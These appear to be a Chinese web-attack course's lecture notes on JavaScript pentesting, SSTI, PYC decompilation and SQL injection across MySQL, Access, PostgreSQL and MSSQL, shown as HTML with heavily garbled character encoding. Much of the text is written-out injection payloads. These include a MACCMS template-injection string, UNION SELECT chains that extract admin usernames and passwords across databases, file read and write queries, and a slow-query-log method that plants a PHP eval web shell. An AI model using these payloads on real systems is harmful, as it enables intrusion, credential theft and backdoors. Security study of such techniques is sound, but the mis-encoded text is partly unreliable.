<h4 id="è¯¦ç»†ç‚¹ï¼š"><a href="#è¯¦ç»†ç‚¹ï¼š" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><h6 id="1ã€ä»€ä¹ˆæ˜¯Jsæ¸—é€æµ‹è¯•ï¼Ÿ"><a href="#1ã€ä»€ä¹ˆæ˜¯Jsæ¸—é€æµ‹è¯•ï¼Ÿ" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯Jsæ¸—é€æµ‹è¯•ï¼Ÿ"></a>1ã€ä»€ä¹ˆæ˜¯Jsæ¸—é€æµ‹è¯•ï¼Ÿ</h6><p>åœ¨Javascriptä¸­ä¹Ÿå­˜åœ¨å˜é‡å’Œå‡½æ•°ï¼Œå½“å­˜åœ¨å¯æ§å˜é‡åŠå‡½æ•°è°ƒç”¨å³å¯å‚æ•°æ¼æ´<br>JSå¼€å‘çš„WEBåº”ç”¨å’ŒPHP,JAVA,NETç­‰åŒºåˆ«åœ¨äºå³æ²¡æœ‰æºä»£ç ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æµè§ˆå™¨çš„æŸ¥çœ‹<br>æºä»£ç è·å–çœŸå®çš„ç‚¹ã€‚æ‰€ä»¥ç›¸å½“äºJSå¼€å‘çš„NEBåº”ç”¨å±äºç™½ç›’æµ‹è¯•ï¼ˆé»˜è®¤æœ‰æºç å‚è€ƒï¼‰</p>
<h6 id="3ã€å¦‚ä½•åˆ¤å®šJSå¼€å‘åº”ç”¨ï¼Ÿ"><a href="#3ã€å¦‚ä½•åˆ¤å®šJSå¼€å‘åº”ç”¨ï¼Ÿ" class="headerlink" title="3ã€å¦‚ä½•åˆ¤å®šJSå¼€å‘åº”ç”¨ï¼Ÿ"></a>3ã€å¦‚ä½•åˆ¤å®šJSå¼€å‘åº”ç”¨ï¼Ÿ</h6><p>æ’ä»¶wappalyzer<br>æºä»£ç ç®€çŸ­<br>å¼•å…¥å¤šä¸ªæ–‡ä»¶<br>ä¸€è‚¡æœ‰&#x2F;static&#x2F;js&#x2F;app.jsç­‰é¡ºåºçš„jæ–‡ä»¶<br>cookieä¸­æœ‰connect.sid</p>
<h6 id="4ã€å¦‚ä½•è·å–æ›´å¤šçš„JSæ–‡ä»¶ï¼Ÿ"><a href="#4ã€å¦‚ä½•è·å–æ›´å¤šçš„JSæ–‡ä»¶ï¼Ÿ" class="headerlink" title="4ã€å¦‚ä½•è·å–æ›´å¤šçš„JSæ–‡ä»¶ï¼Ÿ"></a>4ã€å¦‚ä½•è·å–æ›´å¤šçš„JSæ–‡ä»¶ï¼Ÿ</h6><p>JsFinder<br>Packer-Fuzzer<br>æ‰«æå™¨åç¼€æ›¿æ¢å­—å…¸</p>
<h6 id="5ã€å¦‚ä½•å¿«é€Ÿè·å–ä»·å€¼ä»£ç ï¼Ÿ"><a href="#5ã€å¦‚ä½•å¿«é€Ÿè·å–ä»·å€¼ä»£ç ï¼Ÿ" class="headerlink" title="5ã€å¦‚ä½•å¿«é€Ÿè·å–ä»·å€¼ä»£ç ï¼Ÿ"></a>5ã€å¦‚ä½•å¿«é€Ÿè·å–ä»·å€¼ä»£ç ï¼Ÿ</h6><p>method:â€œgetâ€<br>http.get(â€œ<br>method:â€œpostâ€</p>
<p>$.ajax</p>
<p>service.httphost</p>
<p>service.httget</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-4"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-4" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h6 id="å®‰å…¨æ¡ä»¶å¯æ§å˜é‡-ç‰¹å®šå‡½æ•°"><a href="#å®‰å…¨æ¡ä»¶å¯æ§å˜é‡-ç‰¹å®šå‡½æ•°" class="headerlink" title="å®‰å…¨æ¡ä»¶å¯æ§å˜é‡&amp;ç‰¹å®šå‡½æ•°"></a><strong>å®‰å…¨æ¡ä»¶å¯æ§å˜é‡&amp;ç‰¹å®šå‡½æ•°</strong></h6><h6 id="å¼€å‘æ¡†æ¶-Vulhub-Node-JSå®‰å…¨"><a href="#å¼€å‘æ¡†æ¶-Vulhub-Node-JSå®‰å…¨" class="headerlink" title="å¼€å‘æ¡†æ¶-Vulhub-Node.JSå®‰å…¨"></a><strong>å¼€å‘æ¡†æ¶-Vulhub-Node.JSå®‰å…¨</strong></h6><p>æ­å»ºvulhubé¶åœº å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´â€“å¯è¯»å–æœåŠ¡å™¨ç”¨æˆ·å¯†ç </p>
<h6 id="çœŸå®åº”ç”¨-APPåº”ç”¨ç›´æ¥é‡ç½®å¯†ç "><a href="#çœŸå®åº”ç”¨-APPåº”ç”¨ç›´æ¥é‡ç½®å¯†ç " class="headerlink" title="çœŸå®åº”ç”¨-APPåº”ç”¨ç›´æ¥é‡ç½®å¯†ç "></a><strong>çœŸå®åº”ç”¨-APPåº”ç”¨ç›´æ¥é‡ç½®å¯†ç </strong></h6><p>æœŸè´§APPé€šè¿‡ä¿®æ”¹å‰ç«¯JSéªŒè¯ç ç»•è¿‡éªŒè¯ç è®¤è¯ã€æœªæˆæƒè®¿é—®</p>
<h6 id="çœŸå®åº”ç”¨-è¿æ³•å½©å½©æ–‡ä»¶ä¸Šä¼ å®‰å…¨"><a href="#çœŸå®åº”ç”¨-è¿æ³•å½©å½©æ–‡ä»¶ä¸Šä¼ å®‰å…¨" class="headerlink" title="çœŸå®åº”ç”¨-è¿æ³•å½©å½©æ–‡ä»¶ä¸Šä¼ å®‰å…¨"></a><strong>çœŸå®åº”ç”¨-è¿æ³•å½©å½©æ–‡ä»¶ä¸Šä¼ å®‰å…¨</strong></h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰©å±•ï¼šCTFæ¯”èµ›ä¸­å’Œjsç›¸å…³çš„ä¸»è¦å°±æ˜¯jsçš„åŸå‹é“¾æ±¡æŸ“ï¼Œä»¥åŠæ²™ç›’é€ƒé€¸ï¼Œè¿™ä¸¤ç§å…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„åŸç†ï¼Œé€šè¿‡éæ³•ä¿®æ”¹å˜é‡çš„å€¼å»è¾¾åˆ°ä¸€äº›éæ³•çš„ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬23å¤©-WEBæ”»é˜²-Pythonè€ƒç‚¹-CTFä¸CMS-SSTIæ¨¡ç‰ˆæ³¨å…¥-PYCåç¼–è¯‘"><a href="#ç¬¬23å¤©-WEBæ”»é˜²-Pythonè€ƒç‚¹-CTFä¸CMS-SSTIæ¨¡ç‰ˆæ³¨å…¥-PYCåç¼–è¯‘" class="headerlink" title="ç¬¬23å¤© WEBæ”»é˜²-Pythonè€ƒç‚¹&amp;CTFä¸CMS-SSTIæ¨¡ç‰ˆæ³¨å…¥&amp;PYCåç¼–è¯‘"></a>ç¬¬23å¤© WEBæ”»é˜²-Pythonè€ƒç‚¹&amp;CTFä¸CMS-SSTIæ¨¡ç‰ˆæ³¨å…¥&amp;PYCåç¼–è¯‘</h1><p><a href="https://www.cnblogs.com/bmjoker/p/13653563.html">https://www.cnblogs.com/bmjoker/p/13653563.html</a>       sstiå®æˆ˜</p>
<h4 id="çŸ¥è¯†ç‚¹ï¼š-8"><a href="#çŸ¥è¯†ç‚¹ï¼š-8" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€PYCæ–‡ä»¶åç¼–è¯‘<br>2ã€Python-web-ssrr<br>3ã€SSr1æ¨¡ç‰ˆæ³¨å…¥åˆ©ç”¨åˆ†æ</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-5"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-5" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>PYåç¼–è¯‘-PYCç¼–è¯‘æ–‡ä»¶åç¼–è¯‘æºç <br>SST1å…¥é—¨-åŸç†&amp;åˆ†ç±»&amp;æ£€æµ‹&amp;åˆ†æ&amp;åˆ©ç”¨<br>SsTiè€ƒç‚¹-CTFé¶åœº-WestemnCTFæ—¥shrine<br>SST1è€ƒç‚¹-CMSæºç -MACCMS V8.Xæ‰§è¡Œ<br>PYåç¼–è¯‘-PYCç¼–è¯‘æ–‡ä»¶åç¼–è¯‘æºç </p>
<h6 id="Pycæ–‡ä»¶æ˜¯pyæ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶-byte-code-Pycæ–‡ä»¶ç»è¿‡pythonfè§£é‡Šå™¨"><a href="#Pycæ–‡ä»¶æ˜¯pyæ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶-byte-code-Pycæ–‡ä»¶ç»è¿‡pythonfè§£é‡Šå™¨" class="headerlink" title="#Pycæ–‡ä»¶æ˜¯pyæ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶(byte code),Pycæ–‡ä»¶ç»è¿‡pythonfè§£é‡Šå™¨"></a>#Pycæ–‡ä»¶æ˜¯pyæ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„å­—èŠ‚ç æ–‡ä»¶(byte code),Pycæ–‡ä»¶ç»è¿‡pythonfè§£é‡Šå™¨</h6><p>æœ€ç»ˆä¼šç”Ÿæˆæœºå™¨ç è¿è¡Œï¼Œå› æ­¤pycæ–‡ä»¶æ˜¯å¯ä»¥è·¨å¹³å°éƒ¨ç½²çš„ï¼Œç±»ä¼¼Javaçš„ã€‚c1a3æ–‡ä»¶ï¼Œ<br>ä¸€è‚¡å¦‚yæ–‡ä»¶æ”¹å˜åï¼Œéƒ½ä¼šé‡æ–°ç”Ÿæˆä¸­ycæ–‡ä»¶ã€‚<br>çœŸé¢˜é™„ä»¶ï¼š<a href="http://pan.ba1du.com/s/1jGgB8Ds">http://pan.ba1du.com/s/1jGgB8Ds</a><br>åç¼–è¯‘å¹³å°ï¼š<br><a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><a href="http://tools.bugscaner.com/decompyle/">http://tools.bugscaner.com/decompyle/</a><br>åç¼–è¯‘å·¥å…·ï¼š<a href="https://g1thub.com/w1b1t1/uncompy1e2">https://g1thub.com/w1b1t1/uncompy1e2</a></p>
<h6 id="SSTIå…¥é—¨-åŸç†-åˆ†ç±»-æ£€æµ‹-åˆ†æ-åˆ©ç”¨"><a href="#SSTIå…¥é—¨-åŸç†-åˆ†ç±»-æ£€æµ‹-åˆ†æ-åˆ©ç”¨" class="headerlink" title="#SSTIå…¥é—¨-åŸç†&amp;åˆ†ç±»&amp;æ£€æµ‹&amp;åˆ†æ&amp;åˆ©ç”¨"></a>#SSTIå…¥é—¨-åŸç†&amp;åˆ†ç±»&amp;æ£€æµ‹&amp;åˆ†æ&amp;åˆ©ç”¨</h6><p>1ã€ä»€ä¹ˆæ˜¯SSTI?æœ‰ä»€ä¹ˆæ¼å¸å±å®³ï¼Ÿ</p>
<p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸ºWebåº”ç”¨æ¨¡<br>æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–æ³½é€™æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’­å…¥çš„å¯ä»¥ç ´æ€€æ¨¡<br>æ¿çš„è¯­å¥ï¼Œå› è€Œå¯å½±å¯¼æ•°äº†æ•£æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShe11ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»<br>è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚<br>2ã€å¦‚ä½•åˆ¤æ–­æ£€æµ‹SSTIæ¼æ²³çš„å­˜åœ¨ï¼Ÿ<br>è¾“å…¥çš„æ•°æ®ä¼šè¢«æµè§ˆå™¨åˆ©ç”¨å½“å‰è„šæœ¬è¯­è¨€è°ƒç”¨è§£ææ‰§è¡Œ<br>3ã€SSTIä¼šäº§ç”Ÿåœ¨é‚£äº›è¯­è¨€å¼€å‘åº”ç”¨ï¼Ÿ<br>-è§ä¸Šå›¾<br>4ã€SSTIå®‰å…¨é—®é¢˜åœ¨ç”Ÿäº§ç¯å¢ƒé‚£é‡Œäº§ç”Ÿï¼Ÿ<br>å­˜åœ¨æ¨¡ç‰ˆå¼•ç”¨çš„åœ°æ–¹ï¼Œå¦‚404é”™è¯¯é¡µé¢å±•ç¤º<br>å­˜åœ¨æ•°æ®æ¥æ”¶å¼•ç”¨çš„åœ°æ–¹ï¼Œå¦‚æ¨¡ç‰ˆè§£æè·å–å‚æ•°æ•°æ®<br><a href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br>url_forï¼ˆï¼‰å‡½æ•°æ˜¯ç”¨äºæ„å»ºæ“ä½œæŒ‡å®šå‡½æ•°çš„URL<br>get_flashed_messagesï¼ˆï¼‰å‡½æ•°æ˜¯è·å–ä¼ é€’è¿‡æ¥çš„æ•°æ®<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SSTIè€ƒç‚¹-CMsæºç -MACCMS V8.Xæ‰§è¡Œ</span><br><span class="line">Payload:index.php?m=vod-searchswd=(if-dddd:phpinfoï¼ˆï¼‰](endif-dddd</span><br><span class="line">1ã€æ ¹æ®ä¼ é€’çš„ä»£ç æ‰¾æŒ‡å‘æ–‡ä»¶</span><br><span class="line">2.index-&gt;vod-&gt;tpl-&gt;ifex-&gt;eval</span><br><span class="line">3ã€æ„é€‚Payloadå¸¦å…¥ifexå¹¶ç»•è¿‡åæ‰§è¡Œ</span><br><span class="line">å®æˆ˜ä¸­ä¸€èˆ¬é€šè¿‡ç™½ç›’å®¡è®¡ä»£ç æ˜ç¡®å˜é‡ï¼Œé»‘ç›’æµ‹è¯•ä¸­å¾ˆéš¾å‘ç°ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰©å±•ï¼š</span><br><span class="line">sstiä½œä¸ºctfä¸­å¸¸å‡ºç°çš„é¢˜ç›®ï¼Œæœ‰ç€è®¸å¤šçš„å˜åŒ–ç­‰ï¼Œä¹Ÿè¦å¤šå»çœ‹çœ‹ã€‚</span><br><span class="line">https://blog.csdn.net/qq_35493457/article/details/119938852  flask ssti</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/13508538.html   sstiå…¥é—¨</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬24å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-MYSQLè·¨åº“-ACCESSåç§»"><a href="#ç¬¬24å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-MYSQLè·¨åº“-ACCESSåç§»" class="headerlink" title="ç¬¬24å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;MYSQLè·¨åº“&amp;ACCESSåç§»"></a>ç¬¬24å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;MYSQLè·¨åº“&amp;ACCESSåç§»</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-9"><a href="#çŸ¥è¯†ç‚¹ï¼š-9" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€è„šæœ¬ä»£ç ä¸æ•°æ®åº“å‰ç½®çŸ¥è¯†<br>2ã€Acce33æ•°æ®åº“æ³¨å…¥-ç®€æ˜“åç§»<br>3ã€MYSQLæ•°æ®åº“æ³¨å…¥-ç®€æ˜“&amp;æƒé™è·¨åº“</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>-SQLå·¥æ³¨å…¥æ¼æ´äº§ç”ŸåŸç†åˆ†æ<br>-SQLå·¥æ³¨å…¥æ¼æ´å±å®³åˆ©ç”¨åˆ†æ<br>-è„šæœ¬ä»£ç ä¸æ•°æ®åº“æ“ä½œæµç¨‹<br>-æ•°æ®åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œæ•°æ®<br>-æ•°æ®åº“ç±»å‹ï¼Œæ•°æ®åº“ç”¨æˆ·ï¼Œç”¨æˆ·æƒé™</p>
<p>ä¸ºäº†ç½‘ç«™å’Œæ•°æ®åº“çš„å®‰å…¨æ€§ï¼ŒMYSQLå†…ç½®æœ‰ROOTæœ€é«˜ç”¨æˆ·ï¼Œåˆ’åˆ†ç­‰çº§ï¼Œæ¯ä¸ªç”¨æˆ·å¯¹åº”ç®¡ç†<br>ä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™æ ·ä¿è¯æ— ä¸å…³è”ï¼Œä»è€Œä¸ä¼šå½±å“åˆ°å…¶ä»–æ•°æ®åº“çš„è¿è¡Œã€‚<br>MYSQLä¸¤ç§æ€è·¯ï¼š<br>1ã€éROOTçš„æ³¨å…¥æ”»å‡»ï¼šå¸¸è§„ç±»çš„çŒœè§£<br>2ã€RO0Tç”¨æˆ·çš„æ³¨å…¥æ”»å‡»ï¼šæ–‡ä»¶è¯»å†™æ“ä½œï¼Œè·¨åº“æŸ¥è¯¢æ³¨å…¥ç­‰</p>
<p><strong>MYSQL5.0ä»¥ä¸Šç‰ˆæœ¬ï¼šè‡ªå¸¦çš„æ•°æ®åº“åinformation schema</strong><br><strong>information schema:å­˜å‚¨æ•°æ®åº“ä¸‹çš„æ•°æ®åº“ååŠè¡¨åï¼Œåˆ—åä¿¡æ¯çš„è¡¨</strong><br>è·å–ç›¸å…³æ•°æ®ï¼š<br>lã€æ•°æ®åº“ç‰ˆæœ¬-çœ‹æ˜¯å¦ç¬¦åˆinformation schemaiæŸ¥è¯¢ version()<br>2ã€æ•°æ®åº“ç”¨æˆ·-çœ‹æ˜¯å¦ç¬¦åˆROOTå‹æ³¨å…¥æ”»å‡» user()<br>3ã€å½“å‰æ“ä½œç³»ç»Ÿ-çœ‹æ˜¯å¦æ”¯æŒå¤§å°å†™æˆ–æ–‡ä»¶è·¯å¾„é€‰æ‹© @@version_compile_os()<br>4ã€æ•°æ®åº“å ä¸ºåæœŸæŸ¥è¯¢è¡¨åå’Œåˆ—ååšå‡†å¤‡ database()<br>ROOTç±»å‹æ”»å‡»-çŒœè§£æ•°æ®ï¼Œæ–‡ä»¶è¯»å†™ï¼Œè·¨åº“æŸ¥è¯¢<br>è·å–å½“å‰æ•°æ®åº“ä¸‹é¢çš„è¡¨åä¿¡æ¯ï¼š<br>UNION SELECT table name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table schema&#x3D;â€˜syguestbookâ€™<br>è·å–è¡¨åsyadminuserçš„åˆ—åä¿¡æ¯ï¼š<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.columms where table_name&#x3D;â€™sy_adminuserâ€™I<br>and table schema&#x3D;â€˜syguestbookâ€™<br>è·å–æŒ‡å®šæ•°æ®ï¼š<br>UNION SELECT username,password,<br>3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy adminuser<br>è·¨åº“æ³¨å…¥ï¼šå®ç°å½“å‰ç½‘ç«™è·¨åº“æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å¯¹åº”ç½‘ç«™çš„æ•°æ®<br>è·å–å½“å‰mysq1ä¸‹çš„æ‰€æœ‰æ•°æ®åº“å<br>UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.schmata<br>è·å–æ•°æ®åº“åxhcmsä¸‹çš„è¡¨åä¿¡æ¯<br>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table_schema&#x3D;â€˜xhcmsâ€™<br>è·å–æ•°æ®åº“åxhcmsä¸‹çš„è¡¨manageä¸‹çš„åˆ—åä¿¡æ¯ï¼š<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.columns where table_name&#x3D;â€™manageâ€™and<br>table schema&#x3D;â€™xhcms<br>è·å–æŒ‡å®šæ•°æ®ï¼š<br>UNI0 N SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from xhcms</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼”ç¤ºæ¡ˆä¾‹</span><br><span class="line">ASP+Access-ç®€æ˜“æ³¨å…¥-å­—å…¸çŒœè§£</span><br><span class="line">ç”±äºaccessæ•°æ®åº“ç‰¹æ€§å¯¼è‡´è¿™ä¸ªSQLæ³¨å…¥æ˜¯éœ€è¦å€ŸåŠ©å­—å…¸å»çŒœè§£è¡¨åå’Œåˆ—åçš„ï¼Œé‚£ä¹ˆå°±ä¼š</span><br><span class="line">å‡ºç°è¡¨åæˆ–åˆ—åçŒœè§£ä¸åˆ°ï¼Œå¯ä»¥è‡ªå®šä¹‰ç¤¾å·¥å­—å…¸æˆ–é‡‡ç”¨åç§»æ³¨å…¥ã€‚</span><br><span class="line">ASP+Access-åç§»æ³¨å…¥-æŠ¥é”™æ˜¾ç¤º</span><br><span class="line">åç§»æ³¨å…¥å°±æ˜¯è§£å†³è¡¨åå·²çŸ¥ï¼Œåˆ—åæœªçŸ¥çš„æƒ…å†µï¼</span><br><span class="line">PHP+MYSOL-ç®€æ˜“æ³¨å…¥-å­˜å‚¨ç‰¹æ€§</span><br><span class="line">ä½¿ç”¨é«˜æƒé™è´¦æˆ·å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œè¯»å–å’Œå†™å…¥</span><br><span class="line">PHP+MYSOL-è·¨åº“æ³¨å…¥-æƒé™å±æ€§</span><br><span class="line">ä½¿ç”¨é«˜æƒé™è´¦æˆ·å¯ä»¥å®ç°å¯¹mysqlå…¶ä»–æ•°æ®åº“è¿›è¡Œæ³¨å…¥</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬25å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLè¯»å†™æ³¨å…¥-MYSQL-MSSQL-PostgreSQL"><a href="#ç¬¬25å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLè¯»å†™æ³¨å…¥-MYSQL-MSSQL-PostgreSQL" class="headerlink" title="ç¬¬25å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLè¯»å†™æ³¨å…¥&amp;MYSQL&amp;MSSQL&amp;PostgreSQL"></a>ç¬¬25å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLè¯»å†™æ³¨å…¥&amp;MYSQL&amp;MSSQL&amp;PostgreSQL</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-10"><a href="#çŸ¥è¯†ç‚¹ï¼š-10" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€SQLæ³¨å…¥-MYSQLæ•°æ®åº“<br>2ã€SQLæ³¨å…¥-MSSQæ•°æ®åº“<br>3ã€SQLæ³¨å…¥-PostgreSQLæ•°æ®åº“</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-6"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-6" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>MYSQL-rooté«˜æƒé™è¯»å†™æ³¨å…¥<br>PostgreSQL-é«˜æƒé™è¯»å†™æ³¨å…¥<br>MSSQL-saé«˜æƒé™è¯»å†™æ‰§è¡Œæ³¨å…¥<br>ç»“å°¾å½©è›‹æŸQç‰Œè¿æ³•ç™»é™†æ¡†æ³¨å…¥</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-1"><a href="#è¯¦ç»†ç‚¹ï¼š-1" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>Accessæ— é«˜æƒé™æ³¨å…¥ç‚¹-åªèƒ½çŒœè§£ï¼Œè¿˜æ˜¯æš´åŠ›çŒœè§£<br>MYSQL,PostgreSQL,MSSQLé«˜æƒé™æ³¨å…¥ç‚¹-å¯å‡çº§è¯»å†™æ‰§è¡Œç­‰<br>è¯»å–æ–‡ä»¶ï¼š<br>UNION SELECT1,load file(â€˜d:w.txt),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>å†™å…¥æ–‡ä»¶ï¼š<br>UNION SELECT 1,â€˜xxxxâ€™,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile â€˜d:&#x2F;<a href="http://www.txtâ€™/">www.txtâ€™</a><br>-è·¯å¾„è·å–ï¼šphpinfo,æŠ¥é”™ï¼Œå­—å…¸ç­‰<br>-æ— æ³•å†™å…¥ï¼šsecure_fle_privçªç ´ éœ€è¦æ”¯ç‰¹SQLæ‰§è¡Œç¯å¢ƒï¼Œæ²¡æœ‰å°±éœ€è¦å€ŸåŠ©      <a href="https://www.cnblogs.com/c1e4r/articles/8902444.html%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">https://www.cnblogs.com/c1e4r/articles/8902444.htmlå‚è€ƒæ–‡ç« </a><br>phpmyadmin3æˆ–èƒ½å¤Ÿç›´æ¥è¿ä¸Šå¯¹æ–¹æ•°æ®åº“è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=1; å¯ç”¨æ—¥å¿—æ…¢è®°å½•</span><br><span class="line">set global slow.query.log_fle=â€˜shelliè·¯å¾„â€™ï¼› å°†æ“ä½œè®°å½•å†™å…¥åˆ°æ‰§è¡Œè·¯å¾„æ–‡ä»¶</span><br><span class="line">selectâ€™&lt;?php eval($_GET[A])?&gt;&#x27;or SLEEP(11); å°†åé—¨è¯­å¥æ‰§è¡Œå†™å…¥åˆ°æ…¢æ—¥å¿—æ–‡ä»¶</span><br><span class="line">ä¸æ–‡ä»¶åŒ…å«ä¸­çš„æ—¥å¿—æ–‡ä»¶åŒ…å«æœ‰æ‰€ç±»ä¼¼</span><br></pre></td></tr></table></figure>

<p>#PostgreSQL-é«˜æƒé™è¯»å†™æ³¨å…¥<br>æµ‹åˆ—æ•°ï¼š<br>order by 4<br>and 1&#x3D;2 union select null,null,null,null<br>æµ‹æ˜¾ä½ï¼šç¬¬2,3</p>
<p>and1&#x3D;2 union selectâ€™nulâ€™,null,null,nullé”™è¯¯<br>and1&#x3D;2 union select null,.â€˜nulâ€™,null,nullæ­£å¸¸<br>and 1&#x3D;2 union select null,null,â€˜nullâ€™,nullE<br>and1&#x3D;2 union select null,.null,null,â€™nulâ€™é”™è¯¯<br>è·å–ä¿¡æ¯ï¼š<br>and 1&#x3D;2 UNION SELECT null,version(,null,null<br>and 1&#x3D;2 UNION SELECT null,current user,null,null<br>and 1&#x3D;2 union select null,current databaseï¼ˆï¼‰,null,null<br>è·å–æ•°æ®åº“åï¼š<br>and 1&#x3D;2 union select null,string_agg(datname,),null,null from pg_database</p>
<p>#MSSQL-saé«˜æƒé™è¯»å†™æ‰§è¡Œæ³¨å…¥<br>æµ‹åˆ—æ•°ï¼š<br>order by 4<br>and 1&#x3D;2 union all select null.null.null,null<br>æµ‹æ˜¾ä½ï¼š<br>and 1&#x3D;2 union all select null.1.null.null<br>and 1&#x3D;2 union all select null.null,â€™sâ€™null<br>è·å–ä¿¡æ¯ï¼š<br>@@versionè·å–ç‰ˆæœ¬ä¿¡æ¯<br>db name(0å½“å‰æ•°æ®åº“åå­—<br>userã€system_user,current user,user nameè·å–å½“å‰ç”¨æˆ·å<br>@@SERVERNAMEè·å–æœåŠ¡å™¨ä¸»æœºä¿¡æ¯<br>and 1&#x3D;2 union all select null,db_nameï¼ˆï¼‰,null,null</p>
